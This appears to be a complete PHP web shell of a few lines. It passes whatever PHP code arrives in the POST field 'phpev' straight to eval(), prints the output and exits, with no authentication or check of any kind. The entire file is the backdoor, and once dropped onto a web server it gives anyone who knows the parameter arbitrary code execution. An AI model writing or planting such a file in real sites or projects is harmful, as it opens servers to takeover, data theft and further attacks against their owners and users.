<?php
if(isset($_POST['phpev'])){
	$content =eval($_POST['phpev']);
	echo $content;
	die("");
}
	
?>